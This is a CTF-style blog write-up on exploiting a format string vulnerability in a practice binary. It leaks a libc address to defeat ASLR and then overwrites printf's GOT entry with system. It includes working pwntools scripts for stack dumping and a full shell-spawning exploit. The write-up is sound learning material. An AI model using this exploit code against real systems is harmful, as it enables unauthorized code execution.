---
title: "Performing a GOT overwrite with ASLR enabled"
---

## Overview
This was a challenge that AI created for me. The goal is to exploit a format string vulnerability to perform a GOT overwrite and call `win()`. Although for this blog post, it will be me achieving code execution and bypassing ASLR because I wanted to have more fun.

I created and solved this challenge because I have only mainly read about GOT/PLT and utilizing them in exploit development. I pretty much had no real practical experience.

#### Mitigations
```
Arch:       amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
Debuginfo:  Yes
```
- **ASLR** is enabled on the system.

The one mitigation standing between us and the GOT is **RELRO**. `checksec` reports partial relro which is why this overwrite is possible. If it was `Full RELRO` this technique would not work. 

Partial RELRO leaves `.got.plt` writable, because of something called "Lazy Binding". Lazy Binding is when a function gets called for the first time in a program, the linker writes an entry into `.got.plt`, which holds the lazily-resolved function pointers.

Full RELRO is when every symbol is resolved at startup, and then GOT is locked down to read only permissions. 

---
## Vulnerability
The most common primitive for a GOT overwrite is a format string vulnerability. This is because the `%n` format specifier provides a direct arbitrary write primitive to us.

![vulnerable code photo](/assets/images/solving-got-overwrite-aslr-leak/code.png)

`printf(buf)` is what causes the format string vulnerability to manifest. The `printf` directly prints the buffer. When that `buf` variable contains a format specifier, say `%s`, that would result in the function call being `printf("%s")` when ran.

To confirm the vulnerability, I simply just input a format specifier and view the output:
```
=== Feedback-o-Matic 3000 ===
We value your input. Leave up to 5 comments.
Type 'quit' at any time to leave.

feedback[0]> %p %p %p %p
You said: 0x7ffe29377730 (nil) (nil) 0xa
```

---
## Leaking the Stack
We have to leak a libc address so we can calculate the libc base address, and call `system()` for our shell. Remember, you can't hardcode the address since ASLR is enabled.

But first we need to find our offset and figure out what gets leaked on the stack. To simplify this process, I created a simple script that sends A's and dumps the stack so we can easily inspect what it is we're seeing.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./feedback')
context.log_level = 'debug'
context.terminal = ['zellij', 'run', '--']
count = 50

if args.GDB:
    # main+250 is just past the printf(buf) AND its trailing putchar('\n'),
    # so the leak line is fully flushed (recvline won't block) and the stack
    # is still intact for inspection
    p = gdb.debug('./feedback', gdbscript='''
break *main+250
continue
''')
else:
    p = process()

payload = b'AAAAAAAA ' + b' '.join(b'%%%d$p' % i for i in range(1, count + 1))
p.sendlineafter(b'feedback[0]> ', payload)
p.recvuntil(b'You said: ')
toks = p.recvline().split()[1:] # drop the echoed 'AAAAAAAA'

for i, tok in enumerate(toks, start=1):
    print(f'%{i}$p  {tok.decode()}')

if args.GDB:
    p.interactive() # keep the process (and gdb) alive
else:
    p.close()

```

![stack leak](/assets/images/solving-got-overwrite-aslr-leak/stackleak.png)

First, let's break down what exactly we are seeing in this output. It may seem like random memory addresses but you can simplify this process by having some context.

The first few iterations (1-5) are just from registers being dumped. The amd64 calling convention passes the first arguments in (`rdi, rsi, rdx, rcx, r8`), they are just junk values in this case. Once they are exhausted, we can see the **start** of our own buffer we passed. Since the very first part in our payload was `AAAAAAAA`, and you can see that represented in the leak as `0x4141414141414141`.

Second, we need to find out what iteration reaches the end of the buffer. There are multiple ways to do this, the first being just pattern recognition in the addresses. `7-36` visibly have the same length, and at the 37th iteration it has a smaller length, so that could be a starting point.

Another way that isn't an estimate is basic arithmetic. `256` bytes is allowed into `buf`. What we can do is `256 / 8` (`8` because `%p` reads one 8-byte word) and that gives us `32`, and since our input buffer begins at `6`, it would mean `6 + 32` is where our input ends (`38`). 

---

#### Inspecting the Stack
It's time to inspect the addresses past our input buffer now. For this scenario, I am simply just going to copy and paste each address starting at `38` and inspect it with a debugger. I will be using the `tele` and `xinfo` commands.

![libc leak photo](/assets/images/solving-got-overwrite-aslr-leak/libcleak.png)

Something I came across while inspecting these addresses is that `40` is a libc address, but that isn't the best option here because that points into `__libc_start_main`, one frame above `main`. `41` is the better choice because that slot holds `main`'s saved return address because it points just after the `call main` inside `__libc_start_call_main`.

I will be using pwntools built in functionality to calculate the base from the leak, so noting the offset wouldn't be needed.

---
## Crafting the Exploit
Since I had the offset of my input, and the correct offsets of the format string leak, it is now time to write the exploit. 

```python
from pwn import *

elf = context.binary = ELF('./feedback')
libc = elf.libc

context.terminal = ['zellij', 'run', '-f', '--']

GDBSCRIPT = '''
# break printf
continue
'''

if args.GDB:
    p = gdb.debug('./feedback', gdbscript=GDBSCRIPT)
else:
    p = process()


def leak_libc():
    p.sendlineafter(b'feedback[0]> ', b'%41$p')
    p.recvuntil(b'You said: ')
    leak = int(p.recvline().split()[0], 16)

    return leak - libc.libc_start_main_return


libc.address = leak_libc()
log.success('libc base : %#x', libc.address)
log.success('system    : %#x', libc.sym['system'])

# elf.got['printf'] works because of PIE being disabled
payload = fmtstr_payload(6, {elf.got['printf']: libc.sym['system']})
p.sendlineafter(b'feedback[1]> ', payload)

p.clean(1)

# /bin/sh because you're just in a raw system() call before this gets sent
p.sendline(b'/bin/sh')

p.interactive()
```

Here the main functionality lies within where the `payload` variable gets declared. It writes the address of `system` into `printf`'s GOT entry. Overwriting `printf` was most convenient because it gets called again right after I write. It's basically turning the `printf(buf)` line into `system("/bin/sh")`

---

**Note**: I used `pwntools` functionality `fmtstr_payload`. I did this mainly because I wanted this blog post to be about the GOT overwrite and leak only, not the deep explanation. It is extremely important to know how a manual exploitation of this would go. For example, imagine if the payload generated was too big for the buffer? or contained blacklisted characters?